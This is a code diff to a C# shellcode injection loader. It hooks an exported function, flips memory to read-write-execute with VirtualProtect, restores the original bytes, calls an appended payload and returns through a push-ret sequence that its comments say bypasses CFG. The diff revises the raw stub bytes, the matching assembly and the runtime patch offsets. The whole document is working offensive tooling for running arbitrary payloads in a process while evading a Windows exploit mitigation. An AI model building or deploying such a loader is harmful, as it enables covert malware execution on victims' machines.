@@ -267,15 +267,14 @@ internal static class Program
 
     private static readonly byte[] ShellcodeLoader =
     {
-        /* 0000 */ 0x56, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xBB, 0x44, 0x44, 0x33,
-        /* 0010 */ 0x33, 0x22, 0x22, 0x11, 0x11, 0x48, 0xBE, 0x88, 0x88, 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, 0x48, 
-        /* 0020 */ 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 
-        /* 0030 */ 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xB8, 
-        /* 0040 */ 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 0x09, 0x09, 0x09, 
-        /* 0050 */ 0x89, 0x43, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 
-        /* 0060 */ 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 
-        /* 0070 */ 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 
-        /* 0080 */ 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x5E, 0x53, 0xC3 // actual payload is appended here
+        /* 0000 */ 0x56, 0x53, 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x22, 0x22, 0x11, 0x11, 0x48, 0xBE, 0x88, 0x88,
+        /* 0010 */ 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 
+        /* 0020 */ 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 
+        /* 0030 */ 0xD6, 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 
+        /* 0040 */ 0x09, 0x09, 0x09, 0x89, 0x43, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 
+        /* 0050 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 
+        /* 0060 */ 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x48, 0x8B, 
+        /* 0070 */ 0xCB, 0x5B, 0x5E, 0x51, 0xC3
     };
     
     private static IntPtr GetModuleHandle(string dll)
@@ -319,16 +318,10 @@ internal static class Program
             ; ==========================================
             ; PROLOG: Save registers
             ; ==========================================
-            ; rbx already has the addr of the hooked function via ret
-            push rsi                       ; Save old rsi
-            push rcx                       ; Save all volatile registers
-            push rdx
-            push r8
-            push r9
-            push r10
-            push r11
+            push rsi
+            push rbx
             mov rbx, 1111222233334444h    ; Store hookedFunc in rbx (patched at runtime)
-            mov rsi, 5555666677778888h    ; Store VirtProt in rsi (patched at runtime)
+            mov rsi, 5555666677778888h    ; Store VirtualProtect in rsi (patched at runtime)
 
             ; ==========================================
             ; VIRTUALPROTECT (Change to RWX)
@@ -339,7 +332,6 @@ internal static class Program
             mov r8, 40h                   ; Arg 3: PAGE_EXECUTE_READWRITE (0x40)
             lea r9, [rsp]                 ; Arg 4: oldProtect pointer
             call rsi                      ; Call VirtualProtect
-            add rsp, 28h                  ; Clean up stack 
 
             ; ==========================================
             ; RESTORE ORIGINAL 12 BYTES in hooked func
@@ -352,7 +344,6 @@ internal static class Program
             ; ==========================================
             ; VIRTUALPROTECT (Change back to RX)
             ; ==========================================
-            sub rsp, 28h            ; Allocate shadow space 20h + 8 for oldProtect
             mov rcx, rbx            ; Arg 1: hookedFunc
             mov rdx, 12             ; Arg 2: Size
             mov r8, 20h             ; Arg 3: PAGE_EXECUTE_READ (0x20)
@@ -364,21 +355,16 @@ internal static class Program
             ; CALL THE SHELLCODE
             ; ==========================================
             sub rsp, 40h            ; Allocate shadow space
-            call Payload            ; Call the actual supplied payload (call +11h)
+            call Payload            ; Call the actual supplied payload (call + 0x0B)
             add rsp, 40h            ; Clean up stack
 
             ; ==========================================
             ; EPILOG: Restore and exit
             ; ==========================================
-            pop r11
-            pop r10
-            pop r9
-            pop r8
-            pop rdx
-            pop rcx
+            mov rcx, rbx            ; rbx still holds final return dest, but rbx must be restored now
+            pop rbx
             pop rsi
-
-            push rbx                ; rbx stills hold hookedFunc addr
+            push rcx                ; push final return destination (hookedFuncAddr)
             ret                     ; use push-ret to bypass CFG
 
         MyStub ENDP
@@ -396,19 +382,19 @@ internal static class Program
         using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
 
         // Patch the hooked function address into the shellcode loader stub
-        writer.Seek(0x0D, SeekOrigin.Begin);
+        writer.Seek(0x04, SeekOrigin.Begin);
         writer.Write(hookedFuncAddr);
         writer.Flush();
 
         // Patch the VirtualProtect address into the shellcode loader stub
-        writer.Seek(0x17, SeekOrigin.Begin);
+        writer.Seek(0x0E, SeekOrigin.Begin);
         writer.Write(virtProtAddr);
         writer.Flush();
 
         // Patch the 12 bytes that were in the original export prior to hooking
-        writer.Seek(0x40, SeekOrigin.Begin);
+        writer.Seek(0x33, SeekOrigin.Begin);
         writer.Write(originalInstructions_0_8);
-        writer.Seek(0x4C, SeekOrigin.Begin);
+        writer.Seek(0x3F, SeekOrigin.Begin);
         writer.Write(originalInstructions_8_B);
         writer.Flush();
     }
